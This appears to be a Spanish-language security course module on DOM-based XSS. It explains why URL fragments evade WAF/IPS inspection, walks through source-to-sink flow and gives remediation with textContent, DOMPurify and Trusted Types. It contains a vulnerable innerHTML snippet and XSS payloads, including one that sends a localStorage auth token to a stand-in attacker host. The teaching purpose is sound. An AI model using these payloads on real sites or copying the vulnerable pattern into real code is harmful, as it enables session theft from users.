# Módulo 3 — Cross-Site Scripting (XSS)

## Objetivo 2: Anatomía del DOM XSS

### 1. Introducción: ¿Qué diferencia al DOM XSS del XSS Tradicional?

En los ataques **XSS Reflejado** y **XSS Almacenado**, el código malicioso viaja en una petición HTTP hacia el servidor web, el backend lo incorpora en la respuesta HTML (de forma inmediata o tras guardarlo en una base de datos) y el navegador lo ejecuta al renderizar esa respuesta. Debido a que el *payload* atraviesa la red hacia el servidor, un **WAF (Web Application Firewall)** o un **IPS (Intrusion Prevention System)** ubicado en el perímetro tiene visibilidad total sobre la petición y puede inspeccionar y bloquear las firmas maliciosas.

Por el contrario, el **DOM-Based XSS** ocurre **íntegramente en el lado del cliente (dentro del navegador de la víctima)**. El servidor web nunca llega a recibir, procesar ni reflejar el *payload* malicioso; la vulnerabilidad reside en un script JavaScript legítimo que ya forma parte de la aplicación y que manipula dinámicamente el **Document Object Model (DOM)** de forma insegura.

### 2. El Rol del Fragmento `#` (URI Fragment) y la Invisibilidad ante WAF/IPS

La razón técnica por la cual los WAF e IPS son completamente ciegos ante este vector radica en la especificación del protocolo **HTTP / URI (RFC 3986)** y en cómo los navegadores gestionan el identificador de fragmento (`#`):

1. **Procesamiento exclusivamente local del fragmento `#`:**
   En una URL con estructura `https://sitio.com/perfil#<payload>`, todo el contenido situado a la derecha del carácter `#` (*fragment identifier*) está diseñado originalmente para indicar al navegador una posición interna dentro del documento (como un ancla HTML) o estados locales en aplicaciones *Single Page Application* (SPA).

2. **Omisión en la petición HTTP de red:**
   Por estándar de seguridad y diseño de navegadores, **el fragmento `#` jamás se incluye en la petición HTTP enviada al servidor**. Cuando la víctima hace clic en el enlace malicioso:
   * **Enlace enviado a la víctima:** `https://sitio.com/perfil#<img src=x onerror=alert(document.cookie)>`
   * **Petición real que viaja por la red (y ve el WAF):** `GET /perfil HTTP/1.1`

3. **Ceguera del perímetro defensivo:**
   Como el WAF y el IPS únicamente inspeccionan el tráfico de red entrante y saliente entre el cliente y el servidor, reciben una solicitud `GET /perfil` completamente limpia e inofensiva. El servidor responde con su código HTML y JavaScript estático legítimo (`200 OK`), sin que ninguna alerta perimetral se dispare.

### 3. Mecánica de Ejecución: Flujo *Source* $\rightarrow$ *Sink*

Una vez que el navegador descarga la página legítima, el motor de JavaScript local ejecuta el código vulnerable de la aplicación. En auditoría de código cliente, este flujo se analiza mediante dos componentes:

* **Source (Fuente de datos no confiable):** Es una propiedad o API del navegador controlada por el usuario o atacante de donde el script lee información externa. En este escenario, el *source* es `window.location.hash` (aunque también pueden ser `location.search`, `document.referrer` o `window.name`).
* **Sink (Sumidero peligroso):** Es una función o propiedad del DOM que interpreta cadenas de texto como código HTML o JavaScript ejecutable si recibe datos sin sanitizar (por ejemplo, `innerHTML`, `outerHTML`, `document.write()` o `eval()`).

#### Ejemplo de Código Vulnerable y Flujo de Explotación

Supongamos que el frontend contiene el siguiente código JavaScript para mostrar un saludo personalizado según la sección de la URL:

```javascript
// El script lee el fragmento de la URL (Source) y lo inyecta directo en el HTML (Sink)
const seccion = decodeURIComponent(window.location.hash.substring(1));
document.getElementById("bienvenida").innerHTML = "Sección actual: " + seccion;
```

1. **Entrega:** El atacante envía a la víctima la URL:
   `https://sitio.com/panel#<img src="x" onerror="fetch('https://atacante.com/?t='+localStorage.getItem('auth'))">`
2. **Tránsito limpio:** El navegador solicita `GET /panel`. El WAF no ve el *payload* porque está después del `#`.
3. **Ejecución en el DOM:** Al cargar la página, el JavaScript lee `location.hash`, extrae la etiqueta `<img ...>` y la asigna a `.innerHTML`. El navegador interpreta la cadena como un nodo HTML real, falla al cargar `src="x"` y dispara el evento `onerror`, ejecutando el robo de sesión en el contexto del origen confiable.

### 4. Remediación Recomendada

Dado que los WAF perimetrales no pueden detener el DOM XSS, la mitigación debe aplicarse directamente en el código fuente del frontend:

1. **Uso de Sumideros Seguros (*Safe Sinks*):** Reemplazar propiedades que interpretan HTML como `innerHTML` por alternativas que insertan únicamente texto plano literal, como **`textContent`** o **`innerText`**:
   ```javascript
   // Seguro: el navegador renderiza las etiquetas como texto literal sin ejecutarlas
   document.getElementById("bienvenida").textContent = "Sección actual: " + seccion;
   ```
2. **Sanitización en el Cliente con DOMPurify:** En los casos excepcionales donde sea estrictamente necesario renderizar HTML dinámico en el DOM, sanitizar previamente la entrada mediante `DOMPurify.sanitize(input)` antes de asignarla a `innerHTML`.
3. **Trusted Types API:** Implementar políticas de **Trusted Types** mediante la cabecera `Content-Security-Policy: require-trusted-types-for 'script'`, obligando a nivel de navegador que ningún dato en crudo (*string*) pueda ser pasado a sumideros peligrosos como `innerHTML` sin atravesar previamente una función sanitizadora aprobada.
